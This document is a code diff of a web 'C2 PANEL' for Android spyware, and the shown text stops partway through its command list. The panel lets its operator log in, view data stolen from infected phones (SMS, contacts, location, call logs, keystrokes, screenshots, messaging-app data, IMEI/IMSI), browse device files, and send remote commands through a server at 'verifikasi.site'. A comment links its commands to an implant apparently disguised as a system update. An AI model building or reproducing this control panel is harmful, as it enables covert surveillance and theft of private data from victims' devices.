@@ -3,268 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-    <title>☠️ C2 PANEL - HACKER EDITION</title>
+    <title>C2 PANEL</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        /* ============================================================
-           ROOT - DARK CYBER THEME
-           ============================================================ */
         *{margin:0;padding:0;box-sizing:border-box}
-        :root{
-            --bg-primary:#050a12;
-            --bg-secondary:#0a1628;
-            --bg-card:#0d1a2b;
-            --bg-hover:#162040;
-            --border-color:#1a2a4a;
-            --border-glow:#00ff88;
-            --text-primary:#b8d4e3;
-            --text-muted:#4a6a8a;
-            --text-accent:#00ff88;
-            --text-info:#4fc3f7;
-            --text-danger:#ff4455;
-            --text-warning:#ffbb33;
-            --font-mono:'JetBrains Mono',monospace;
-            --shadow-glow:0 0 30px rgba(0,255,136,0.05);
-        }
-        body{background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);min-height:100vh;font-size:13px;overflow-x:hidden}
-        ::-webkit-scrollbar{width:4px}
-        ::-webkit-scrollbar-track{background:var(--bg-secondary)}
-        ::-webkit-scrollbar-thumb{background:var(--border-color);border-radius:2px}
-        ::-webkit-scrollbar-thumb:hover{background:var(--text-accent)}
-        a{color:var(--text-info);text-decoration:none}
+        body{background:#050a12;color:#b8d4e3;font-family:'JetBrains Mono',monospace;font-size:13px}
         .container{max-width:1600px;margin:0 auto;padding:10px}
-        .flex{display:flex}
-        .flex-between{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
-        .flex-center{display:flex;align-items:center;gap:8px}
-        .flex-col{flex-direction:column}
-        .gap-8{gap:8px}
-        .gap-12{gap:12px}
-        .mb-8{margin-bottom:8px}
-        .mb-12{margin-bottom:12px}
-        .mt-8{margin-top:8px}
-        .text-muted{color:var(--text-muted)}
-        .text-accent{color:var(--text-accent)}
-        .text-info{color:var(--text-info)}
-        .text-danger{color:var(--text-danger)}
-        .text-warning{color:var(--text-warning)}
-        .text-center{text-align:center}
-        .w-full{width:100%}
+        .login-container{max-width:400px;margin:70px auto;background:#0a1628;padding:40px;border-radius:12px;border:1px solid #1a2a4a;text-align:center}
+        .login-container input{width:100%;padding:12px;border-radius:6px;border:1px solid #1a2a4a;background:#050a12;color:#fff;margin-bottom:12px}
+        .login-container button{width:100%;padding:12px;border-radius:6px;background:#0d1a2b;color:#00ff88;border:1px solid #1a2a4a;cursor:pointer}
         .hidden{display:none}
-        .glow-text{text-shadow:0 0 20px rgba(0,255,136,0.15)}
-        .border-glow{border-color:var(--border-glow)!important;box-shadow:0 0 15px rgba(0,255,136,0.1)}
-
-        /* ============================================================
-           LOGIN - CYBER
-           ============================================================ */
-        .login-container{max-width:400px;margin:70px auto;background:var(--bg-secondary);padding:40px;border-radius:12px;border:1px solid var(--border-color);box-shadow:0 0 80px rgba(0,0,0,0.9),inset 0 0 60px rgba(0,255,136,0.02)}
-        .login-container .logo{text-align:center;font-size:32px;font-weight:800;color:var(--text-accent);letter-spacing:2px;margin-bottom:4px}
-        .login-container .logo span{color:var(--text-info)}
-        .login-container .sub{text-align:center;color:var(--text-muted);font-size:12px;margin-bottom:25px;letter-spacing:2px}
-        .login-container .sub .cursor{display:inline-block;width:8px;height:14px;background:var(--text-accent);animation:blink 1s step-end infinite;vertical-align:middle;margin-left:4px}
-        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-        .login-container input{width:100%;padding:12px 16px;border-radius:6px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:14px;outline:none;margin-bottom:12px;transition:0.3s}
-        .login-container input:focus{border-color:var(--text-accent);box-shadow:0 0 25px rgba(0,255,136,0.08)}
-        .login-container button{width:100%;padding:12px;border-radius:6px;border:none;background:linear-gradient(135deg,#0d1a2b,#050a12);color:var(--text-accent);font-family:var(--font-mono);font-size:14px;font-weight:700;cursor:pointer;transition:0.3s;border:1px solid var(--border-color);letter-spacing:1px}
-        .login-container button:hover{background:linear-gradient(135deg,#1a2a4a,#0d1a2b);border-color:var(--text-accent);box-shadow:0 0 30px rgba(0,255,136,0.1)}
-        .login-error{color:var(--text-danger);text-align:center;margin-top:10px;font-size:12px;display:none}
-        .login-container .version{text-align:center;color:var(--text-muted);font-size:10px;margin-top:15px;letter-spacing:1px}
-
-        /* ============================================================
-           HEADER
-           ============================================================ */
-        .header{background:var(--bg-secondary);padding:8px 16px;border-radius:8px;border:1px solid var(--border-color);margin-bottom:10px;backdrop-filter:blur(10px)}
-        .header .logo{font-size:16px;font-weight:800;color:var(--text-accent);letter-spacing:1px}
-        .header .logo span{color:var(--text-info)}
-        .header .status{font-size:10px;color:var(--text-muted)}
-        .header .status .dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--text-accent);animation:pulse 1.5s infinite;margin-right:4px}
-        @keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 10px rgba(0,255,136,0.5)}50%{opacity:0.2;box-shadow:0 0 0px rgba(0,255,136,0)}}
-        .header .badge{background:var(--bg-primary);padding:2px 10px;border-radius:10px;font-size:9px;color:var(--text-info);border:1px solid var(--border-color);font-weight:700}
-        .header .badge .num{color:var(--text-accent)}
-        .header .logout-btn{background:transparent;border:1px solid #3a1a2a;color:var(--text-danger);padding:3px 12px;border-radius:4px;cursor:pointer;font-family:var(--font-mono);font-size:10px;transition:0.3s}
-        .header .logout-btn:hover{background:#3a1a2a;border-color:var(--text-danger)}
-
-        /* ============================================================
-           STATS - 16 CARD WITH GLOW
-           ============================================================ */
         .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(80px,1fr));gap:4px;margin-bottom:10px}
-        .stat-card{background:var(--bg-card);padding:6px 4px;border-radius:4px;border:1px solid var(--border-color);text-align:center;transition:0.3s;cursor:default}
-        .stat-card:hover{border-color:var(--text-accent);box-shadow:0 0 20px rgba(0,255,136,0.05)}
-        .stat-card .num{font-size:16px;font-weight:800;color:var(--text-accent);line-height:1.2;font-variant-numeric:tabular-nums}
-        .stat-card .label{font-size:6.5px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.3px;margin-top:1px;line-height:1.2}
-
-        /* ============================================================
-           TABS
-           ============================================================ */
-        .tabs{display:flex;gap:2px;flex-wrap:wrap;margin-bottom:10px;background:var(--bg-secondary);padding:4px;border-radius:6px;border:1px solid var(--border-color)}
-        .tab{background:transparent;padding:6px 14px;border-radius:4px;cursor:pointer;border:none;color:var(--text-muted);font-family:var(--font-mono);font-size:10px;font-weight:700;transition:0.3s;letter-spacing:0.5px}
-        .tab:hover{color:var(--text-primary);background:var(--bg-primary)}
-        .tab.active{background:var(--bg-primary);color:var(--text-accent);box-shadow:inset 0 0 20px rgba(0,255,136,0.03)}
-        .tab .icon{margin-right:3px}
-
-        /* ============================================================
-           PANELS
-           ============================================================ */
-        .panel{display:none;background:var(--bg-secondary);border-radius:6px;padding:12px;border:1px solid var(--border-color)}
-        .panel.active{display:block;animation:fadeIn 0.2s ease}
-        @keyframes fadeIn{0%{opacity:0;transform:translateY(4px)}100%{opacity:1;transform:translateY(0)}}
-
-        /* ============================================================
-           TABLE - CYBER
-           ============================================================ */
-        .table-wrap{overflow-x:auto;max-height:480px;overflow-y:auto;border-radius:4px;border:1px solid var(--border-color)}
+        .stat-card{background:#0d1a2b;padding:6px;border-radius:4px;border:1px solid #1a2a4a;text-align:center}
+        .stat-card .num{font-size:16px;font-weight:800;color:#00ff88}
+        .stat-card .label{font-size:7px;color:#4a6a8a}
+        .tabs{display:flex;gap:2px;margin-bottom:10px;background:#0a1628;padding:4px;border-radius:6px;border:1px solid #1a2a4a}
+        .tab{background:transparent;padding:6px 14px;border-radius:4px;cursor:pointer;border:none;color:#4a6a8a;font-size:10px}
+        .tab.active{background:#050a12;color:#00ff88}
+        .panel{display:none;background:#0a1628;border-radius:6px;padding:12px;border:1px solid #1a2a4a}
+        .panel.active{display:block}
+        .table-wrap{overflow-x:auto;max-height:480px;overflow-y:auto}
         table{width:100%;border-collapse:collapse;font-size:10px}
-        th{background:var(--bg-primary);padding:5px 8px;text-align:left;color:var(--text-info);border-bottom:2px solid var(--border-color);position:sticky;top:0;z-index:10;font-weight:700;font-size:8px;text-transform:uppercase;letter-spacing:0.5px}
-        td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.02);word-break:break-all;font-size:10px}
-        tr:hover{background:var(--bg-card)}
-        .map-btn{display:inline-block;background:var(--bg-primary);padding:1px 6px;border-radius:3px;font-size:8px;border:1px solid var(--border-color);transition:0.3s;color:var(--text-info)}
-        .map-btn:hover{border-color:var(--text-accent);color:var(--text-accent)}
-
-        /* ============================================================
-           C2 COMMANDS - GRID
-           ============================================================ */
+        th{background:#050a12;padding:5px 8px;text-align:left;color:#4fc3f7;border-bottom:2px solid #1a2a4a;position:sticky;top:0}
+        td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.02)}
         .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:4px}
-        .cmd-btn{background:var(--bg-primary);padding:4px 6px;border-radius:4px;border:1px solid var(--border-color);color:var(--text-primary);cursor:pointer;text-align:center;font-size:8px;font-family:var(--font-mono);transition:0.3s}
-        .cmd-btn:hover{background:var(--bg-card);border-color:var(--text-accent);color:var(--text-accent)}
-        .cmd-btn.danger{border-color:#3a1a2a;color:var(--text-danger)}
-        .cmd-btn.danger:hover{background:#3a1a2a}
+        .cmd-btn{background:#050a12;padding:4px 6px;border-radius:4px;border:1px solid #1a2a4a;color:#b8d4e3;cursor:pointer;text-align:center;font-size:9px}
+        .cmd-btn:hover{border-color:#00ff88}
+        .cmd-btn.danger{border-color:#3a1a2a;color:#ff4455}
         .cmd-btn.success{border-color:#1a3a2a;color:#4caf50}
-        .cmd-btn.success:hover{background:#1a3a2a}
-        .cmd-btn.warning{border-color:#3a2a1a;color:var(--text-warning)}
-        .cmd-btn.warning:hover{background:#3a2a1a}
-        .cmd-category{margin-bottom:8px}
-        .cmd-category .cat-title{color:var(--text-info);font-size:9px;font-weight:700;margin-bottom:4px;padding:2px 8px;background:var(--bg-primary);border-radius:4px;border-left:2px solid var(--text-accent);display:flex;justify-content:space-between;align-items:center}
-        .cmd-category .cat-title .count{color:var(--text-muted);font-weight:400;font-size:8px}
-
-        /* ============================================================
-           SEARCH & INPUT
-           ============================================================ */
-        .search-box{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px}
-        .search-box input,.search-box select{padding:4px 8px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:10px;outline:none;min-width:80px;flex:1}
-        .search-box input:focus,.search-box select:focus{border-color:var(--text-accent)}
-        .search-box select{flex:0.3;min-width:60px;cursor:pointer}
-
-        .input-group{display:flex;gap:4px;margin:6px 0;flex-wrap:wrap}
-        .input-group input{padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:10px;flex:1;min-width:80px;outline:none}
-        .input-group input:focus{border-color:var(--text-accent)}
-        .input-group button{padding:4px 12px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-info);cursor:pointer;font-family:var(--font-mono);font-size:10px;transition:0.3s}
-        .input-group button:hover{background:var(--bg-card);border-color:var(--text-accent)}
-        .btn-refresh{padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);cursor:pointer;font-family:var(--font-mono);font-size:10px;transition:0.3s}
-        .btn-refresh:hover{background:var(--bg-card);border-color:var(--text-accent)}
-
-        /* ============================================================
-           LOGS - TERMINAL STYLE
-           ============================================================ */
-        .log-area{background:var(--bg-primary);border-radius:4px;padding:8px;height:260px;overflow-y:auto;font-size:9px;border:1px solid var(--border-color);font-family:var(--font-mono)}
-        .log-entry{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02);display:flex;gap:6px}
-        .log-entry .time{color:var(--text-info);min-width:60px;font-size:8px}
-        .log-entry .type{color:var(--text-muted);min-width:40px;font-size:8px}
-        .log-entry .data{color:var(--text-primary);font-size:9px}
-        .log-entry .data .highlight{color:var(--text-accent)}
-
-        /* ============================================================
-           MAP
-           ============================================================ */
-        #map{height:280px;border-radius:4px;border:1px solid var(--border-color);margin-top:4px;background:var(--bg-primary)}
-        .location-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:4px;margin-top:6px;max-height:100px;overflow-y:auto}
-        .location-item{background:var(--bg-primary);padding:3px 6px;border-radius:4px;border:1px solid var(--border-color);display:flex;justify-content:space-between;align-items:center;font-size:9px;cursor:pointer;transition:0.3s}
-        .location-item:hover{border-color:var(--text-accent)}
-
-        /* ============================================================
-           MEDIA
-           ============================================================ */
-        .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px}
-        .media-card{background:var(--bg-primary);border-radius:4px;border:1px solid var(--border-color);overflow:hidden;cursor:pointer;transition:0.3s}
-        .media-card:hover{border-color:var(--text-accent);transform:scale(1.02)}
-        .media-card .preview{width:100%;height:80px;object-fit:cover;background:var(--bg-primary);display:flex;justify-content:center;align-items:center;font-size:28px}
-        .media-card .info{padding:3px 5px;font-size:8px;color:var(--text-muted);display:flex;justify-content:space-between}
-        .media-card .info .sumber{color:var(--text-info)}
-
-        /* ============================================================
-           FILES
-           ============================================================ */
-        .file-breadcrumb{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px;padding:4px 10px;background:var(--bg-primary);border-radius:4px;align-items:center;font-size:10px;border:1px solid var(--border-color)}
-        .file-breadcrumb span{cursor:pointer;color:var(--text-info)}
-        .file-breadcrumb span:hover{text-decoration:underline}
-        .file-item{display:flex;justify-content:space-between;align-items:center;padding:3px 6px;border-bottom:1px solid rgba(255,255,255,0.02);cursor:pointer;font-size:10px}
-        .file-item:hover{background:var(--bg-primary)}
-        .file-item .actions{display:flex;gap:4px}
-        .file-item .actions button{background:transparent;border:none;cursor:pointer;font-size:11px;transition:0.3s}
-        .file-item .actions .download-btn{color:var(--text-info)}
-        .file-item .actions .download-btn:hover{color:var(--text-accent)}
-        .file-item .actions .delete-btn{color:var(--text-danger)}
-        .file-item .actions .delete-btn:hover{color:#ff4444}
-
-        /* ============================================================
-           MODAL
-           ============================================================ */
-        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center;backdrop-filter:blur(5px)}
+        .log-area{background:#050a12;border-radius:4px;padding:8px;height:260px;overflow-y:auto;font-size:9px;border:1px solid #1a2a4a;font-family:monospace}
+        #map{height:280px;border-radius:4px;border:1px solid #1a2a4a}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center}
         .modal.active{display:flex}
-        .modal-content{background:var(--bg-secondary);padding:20px;border-radius:8px;max-width:650px;width:94%;border:1px solid var(--border-color);max-height:88vh;overflow-y:auto}
-        .modal-close{float:right;background:transparent;border:none;color:var(--text-muted);font-size:18px;cursor:pointer;font-family:var(--font-mono)}
-        .modal-close:hover{color:var(--text-primary)}
-
-        .empty-state{text-align:center;color:var(--text-muted);padding:20px;grid-column:1/-1;font-size:11px}
-
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
-        @media(max-width:768px){
-            .header{flex-direction:column;gap:4px;text-align:center}
-            .header-right{justify-content:center;flex-wrap:wrap}
-            .stats{grid-template-columns:repeat(4,1fr)}
-            .stat-card .num{font-size:13px}
-            .tabs{justify-content:center}
-            .search-box{flex-direction:column}
-            .search-box input,.search-box select{flex:1;width:100%}
-            .input-group{flex-direction:column}
-            .cmd-grid{grid-template-columns:1fr 1fr}
-            .location-list{grid-template-columns:1fr}
-            .media-grid{grid-template-columns:1fr 1fr}
-        }
-        @media(max-width:480px){
-            .stats{grid-template-columns:repeat(3,1fr)}
-            .stat-card .num{font-size:12px}
-            .cmd-grid{grid-template-columns:1fr}
-            .media-grid{grid-template-columns:1fr}
-        }
+        .modal-content{background:#0a1628;padding:20px;border-radius:8px;max-width:650px;width:94%;border:1px solid #1a2a4a}
+        .modal-close{float:right;background:transparent;border:none;color:#4a6a8a;font-size:18px;cursor:pointer}
     </style>
 </head>
 <body>
 
-<!-- ============================================================
-     LOGIN
-     ============================================================ -->
 <div id="loginContainer" class="login-container">
-    <div class="logo">☠️ C2<span>PANEL</span></div>
-    <div class="sub">Command &amp; Control Center v6.0 <span class="cursor"></span></div>
-    <input type="password" id="loginPassword" placeholder="Enter master key..." onkeydown="if(event.key==='Enter')login()">
+    <div style="font-size:24px;font-weight:800;color:#00ff88;margin-bottom:10px">☠️ C2 PANEL</div>
+    <input type="password" id="loginPassword" placeholder="Master Key" onkeydown="if(event.key==='Enter')login()">
     <button onclick="login()">🔓 ACCESS</button>
-    <div id="loginError" class="login-error">❌ Invalid credentials</div>
-    <div class="version">⚡ 48 Commands • 16 Stats • WebSocket • Real-time</div>
+    <div id="loginError" style="color:#ff4455;margin-top:10px;display:none">Invalid</div>
 </div>
 
-<!-- ============================================================
-     DASHBOARD
-     ============================================================ -->
-<div id="dashboardContent" class="dashboard-content hidden">
+<div id="dashboardContent" class="hidden">
     <div class="container">
-
-        <!-- HEADER -->
-        <div class="header flex-between">
-            <div class="flex-center gap-8">
-                <div class="logo">☠️ C2<span>PANEL</span></div>
-                <div class="status flex-center"><span class="dot"></span><span id="statusText">Online</span></div>
-            </div>
-            <div class="flex-center gap-8 flex-wrap">
-                <span class="badge">📱 <span class="num" id="deviceCount">0</span> Devices</span>
-                <span class="badge">⚡ <span class="num" id="cmdCount">48</span> Commands</span>
-                <span class="badge">📊 <span class="num" id="statTotalHeader">0</span> Total</span>
-                <button class="logout-btn" onclick="logout()">🚪 Logout</button>
-            </div>
+        <div style="display:flex;justify-content:space-between;background:#0a1628;padding:8px 16px;border-radius:8px;border:1px solid #1a2a4a;margin-bottom:10px">
+            <div>☠️ C2 PANEL</div>
+            <div><span id="deviceCount">0</span> Devices | <button onclick="logout()" style="background:transparent;border:1px solid #3a1a2a;color:#ff4455;padding:2px 12px;border-radius:4px;cursor:pointer">Logout</button></div>
         </div>
 
-        <!-- STATS - 16 CARD -->
         <div class="stats" id="statsContainer">
             <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
             <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Devices</div></div>
@@ -272,938 +63,262 @@
             <div class="stat-card"><div class="num" id="statContacts">0</div><div class="label">Contacts</div></div>
             <div class="stat-card"><div class="num" id="statLocation">0</div><div class="label">Location</div></div>
             <div class="stat-card"><div class="num" id="statCallLog">0</div><div class="label">Call Log</div></div>
-            <div class="stat-card"><div class="num" id="statClipboard">0</div><div class="label">Clipboard</div></div>
             <div class="stat-card"><div class="num" id="statScreenshot">0</div><div class="label">Screenshot</div></div>
             <div class="stat-card"><div class="num" id="statKeylogger">0</div><div class="label">Keylogger</div></div>
-            <div class="stat-card"><div class="num" id="statWhatsApp">0</div><div class="label">WhatsApp</div></div>
-            <div class="stat-card"><div class="num" id="statTelegram">0</div><div class="label">Telegram</div></div>
-            <div class="stat-card"><div class="num" id="statAudio">0</div><div class="label">Audio</div></div>
-            <div class="stat-card"><div class="num" id="statVideo">0</div><div class="label">Video</div></div>
-            <div class="stat-card"><div class="num" id="statScreenRec">0</div><div class="label">Screen Rec</div></div>
             <div class="stat-card"><div class="num" id="statFiles">0</div><div class="label">Files</div></div>
             <div class="stat-card"><div class="num" id="statC2">0</div><div class="label">C2 Exec</div></div>
         </div>
 
-        <!-- TABS -->
         <div class="tabs">
-            <div class="tab active" onclick="showPanel('data')"><span class="icon">📊</span> Data</div>
-            <div class="tab" onclick="showPanel('map')"><span class="icon">🗺️</span> Map</div>
-            <div class="tab" onclick="showPanel('c2')"><span class="icon">⚡</span> C2</div>
-            <div class="tab" onclick="showPanel('logs')"><span class="icon">📋</span> Logs</div>
-            <div class="tab" onclick="showPanel('media')"><span class="icon">📸</span> Media</div>
-            <div class="tab" onclick="showPanel('files')"><span class="icon">📁</span> Files</div>
-            <div class="tab" onclick="showPanel('stats')"><span class="icon">📈</span> Stats</div>
+            <div class="tab active" onclick="showPanel('data')">📊 Data</div>
+            <div class="tab" onclick="showPanel('map')">🗺️ Map</div>
+            <div class="tab" onclick="showPanel('c2')">⚡ C2</div>
+            <div class="tab" onclick="showPanel('logs')">📋 Logs</div>
+            <div class="tab" onclick="showPanel('media')">📸 Media</div>
+            <div class="tab" onclick="showPanel('files')">📁 Files</div>
         </div>
 
-        <!-- PANEL DATA -->
         <div class="panel active" id="panelData">
-            <div class="flex-between mb-8">
-                <div class="search-box" style="flex:1">
-                    <input type="text" id="searchInput" placeholder="🔍 Search data..." oninput="filterData()">
-                    <select id="filterType" onchange="filterData()">
-                        <option value="">All Sources</option>
-                        <option value="sms">SMS</option>
-                        <option value="kontak">Contacts</option>
-                        <option value="lokasi">Location</option>
-                        <option value="device_info">Device</option>
-                        <option value="screenshot">Screenshot</option>
-                        <option value="clipboard">Clipboard</option>
-                        <option value="call_log">Call Log</option>
-                        <option value="keylogger">Keylogger</option>
-                        <option value="whatsapp">WhatsApp</option>
-                        <option value="telegram">Telegram</option>
-                        <option value="audio_record">Audio</option>
-                        <option value="video_record">Video</option>
-                        <option value="screen_record">Screen Rec</option>
-                        <option value="wifi_info">WiFi</option>
-                        <option value="battery">Battery</option>
-                        <option value="installed_apps">Installed Apps</option>
-                        <option value="imei">IMEI</option>
-                        <option value="imsi">IMSI</option>
-                        <option value="phone_number">Phone</option>
-                        <option value="notifications">Notifications</option>
-                    </select>
-                </div>
-                <div class="flex-center gap-8">
-                    <button class="btn-refresh" onclick="refreshData()">🔄 Refresh</button>
-                    <button class="btn-refresh" onclick="exportData()">📤 Export</button>
-                </div>
+            <div style="display:flex;gap:8px;margin-bottom:8px">
+                <input type="text" id="searchInput" placeholder="Search..." oninput="filterData()" style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
+                <select id="filterType" onchange="filterData()" style="padding:4px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
+                    <option value="">All</option>
+                    <option value="sms">SMS</option>
+                    <option value="kontak">Contacts</option>
+                    <option value="lokasi">Location</option>
+                    <option value="screenshot">Screenshot</option>
+                    <option value="keylogger">Keylogger</option>
+                </select>
+                <button onclick="refreshData()" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff;cursor:pointer">Refresh</button>
             </div>
             <div class="table-wrap">
-                <table>
-                    <thead><tr><th style="min-width:130px">Time</th><th style="min-width:90px">Source</th><th>Data</th><th style="min-width:70px">Device</th><th style="min-width:50px">Action</th></tr></thead>
-                    <tbody id="dataTableBody"></tbody>
-                </table>
+                <table><thead><tr><th>Time</th><th>Source</th><th>Data</th><th>Device</th></tr></thead><tbody id="dataTableBody"></tbody></table>
             </div>
         </div>
 
-        <!-- PANEL MAP -->
         <div class="panel" id="panelMap">
-            <div class="flex-between mb-8">
-                <span class="text-accent" style="font-weight:700;font-size:12px">🗺️ Geolocation</span>
-                <button class="btn-refresh" onclick="refreshMap()">🔄 Refresh</button>
-            </div>
             <div id="map"></div>
-            <div class="location-list" id="locationList"></div>
         </div>
 
-        <!-- PANEL C2 -->
         <div class="panel" id="panelC2">
-            <div class="flex-between mb-8">
-                <span class="text-accent" style="font-weight:700;font-size:12px">⚡ Command &amp; Control</span>
-                <span class="text-muted" style="font-size:9px">48 commands</span>
+            <div id="cmdContainer" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:4px"></div>
+            <div style="margin-top:8px;display:flex;gap:4px">
+                <input type="text" id="customCmd" placeholder="Custom command..." style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
+                <input type="text" id="customParam" placeholder="Param" style="flex:0.3;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
+                <button onclick="sendCustomCommand()" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#00ff88;cursor:pointer">Send</button>
             </div>
-            <div class="search-box">
-                <input type="text" id="cmdSearch" placeholder="🔍 Search command..." oninput="filterCommands()">
-                <select id="cmdCategoryFilter" onchange="filterCommands()">
-                    <option value="">All Categories</option>
-                    <option value="data">📱 Data (10)</option>
-                    <option value="notif">🔔 Notifications (4)</option>
-                    <option value="keylogger">⌨️ Keylogger (4)</option>
-                    <option value="komunikasi">💬 Communication (3)</option>
-                    <option value="apps">📱 Apps (5)</option>
-                    <option value="target">💰 Targets (7)</option>
-                    <option value="media">🎥 Media (5)</option>
-                    <option value="screen">📹 Screen Rec (3)</option>
-                    <option value="file">📁 Files (2)</option>
-                    <option value="sistem">🔧 System (5)</option>
-                </select>
-            </div>
-            <div id="cmdContainer"></div>
-            <div class="input-group">
-                <input type="text" id="customCmd" placeholder="📝 Custom command..." onkeydown="if(event.key==='Enter')sendCustomCommand()">
-                <input type="text" id="customParam" placeholder="📝 Params (optional)" style="flex:0.3">
-                <button onclick="sendCustomCommand()">📤 Send</button>
-            </div>
-            <div id="cmdResult" class="hidden" style="margin-top:6px;padding:6px 10px;background:var(--bg-primary);border-radius:4px;font-size:10px;max-height:100px;overflow-y:auto;border:1px solid var(--border-color);font-family:monospace"></div>
         </div>
 
-        <!-- PANEL LOGS -->
         <div class="panel" id="panelLogs">
-            <div class="flex-between mb-8">
-                <span class="text-accent" style="font-weight:700;font-size:12px">📋 Activity Logs</span>
-                <div class="flex-center gap-8">
-                    <input type="text" id="logSearch" placeholder="🔍 Filter..." oninput="filterLogs()" style="padding:3px 8px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);font-size:9px;outline:none;width:120px">
-                    <button class="btn-refresh" onclick="clearLogs()" style="font-size:9px">🗑️ Clear</button>
-                </div>
-            </div>
             <div class="log-area" id="logArea"></div>
         </div>
 
-        <!-- PANEL MEDIA -->
         <div class="panel" id="panelMedia">
-            <div class="flex-between mb-8">
-                <span class="text-accent" style="font-weight:700;font-size:12px">📸 Media Gallery</span>
-                <button class="btn-refresh" onclick="renderMedia()">🔄 Refresh</button>
-            </div>
-            <div class="media-grid" id="mediaGallery"></div>
+            <div id="mediaGallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px"></div>
         </div>
 
-        <!-- PANEL FILES -->
         <div class="panel" id="panelFiles">
-            <div class="flex-between mb-8">
-                <span class="text-accent" style="font-weight:700;font-size:12px">📁 File Manager</span>
-                <div class="flex-center gap-6">
-                    <button class="btn-refresh" onclick="renderFiles('/sdcard/')" style="font-size:8px">📂 /sdcard</button>
-                    <button class="btn-refresh" onclick="renderFiles('/storage/emulated/0/')" style="font-size:8px">📂 Internal</button>
-                    <button class="btn-refresh" onclick="uploadFile()" style="font-size:8px;color:var(--text-info)">📤 Upload</button>
-                    <button class="btn-refresh" onclick="renderFiles(currentFilePath)" style="font-size:8px">🔄 Refresh</button>
-                </div>
-            </div>
             <div id="fileList"></div>
         </div>
-
-        <!-- PANEL STATS -->
-        <div class="panel" id="panelStats">
-            <div class="flex-between mb-8">
-                <span class="text-accent" style="font-weight:700;font-size:12px">📈 Detailed Statistics</span>
-                <button class="btn-refresh" onclick="renderStats()">🔄 Refresh</button>
-            </div>
-            <div id="statsDetail" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:4px"></div>
-        </div>
-
     </div>
 </div>
 
-<!-- MODAL -->
-<div class="modal" id="modal">
-    <div class="modal-content">
-        <button class="modal-close" onclick="closeModal()">&times;</button>
-        <div id="modalBody"></div>
-    </div>
-</div>
+<div class="modal" id="modal"><div class="modal-content"><button class="modal-close" onclick="closeModal()">×</button><div id="modalBody"></div></div></div>
 
-<!-- LEAFTLET JS -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
-<!-- ============================================================
-     MAIN SCRIPT - FULL INTEGRATION (PERBAIKAN HEADER X-Password)
-     ============================================================ -->
 <script>
 // ============================================================
-// ☠️ C2 PANEL ULTIMATE v6.0 - PROFESSIONAL HACKER EDITION
+// DASHBOARD - REAL
 // ============================================================
 
-// ============================================================
-// GLOBALS
-// ============================================================
 var PASSWORD = '';
 var allData = [];
 var logEntries = [];
-var ws = null;
-var currentFilePath = '/sdcard/';
 var map = null;
-var mapMarkers = [];
-var wsConnected = false;
-var refreshInterval = null;
+var SERVER = 'https://verifikasi.site';
 
-// ============================================================
-// 48 COMMANDS - SAME AS SystemUpdate.html & SystemService.java
-// ============================================================
-var C2_COMMANDS = {
-    'data': {
-        label: '📱 Data (10)',
-        commands: [
-            {id:'ambil_kontak', label:'📇 Contacts'},
-            {id:'ambil_sms', label:'💬 SMS'},
-            {id:'ambil_call_log', label:'📞 Call Log'},
-            {id:'ambil_lokasi', label:'📍 Location'},
-            {id:'get_clipboard', label:'📋 Clipboard'},
-            {id:'set_clipboard', label:'📋 Set Clipboard', param:'text'},
-            {id:'ambil_imei', label:'📱 IMEI'},
-            {id:'ambil_imsi', label:'📱 IMSI'},
-            {id:'ambil_nomor_hp', label:'📱 Phone'},
-            {id:'get_installed_apps', label:'📱 Apps'}
-        ]
-    },
-    'notif': {
-        label: '🔔 Notifications (4)',
-        commands: [
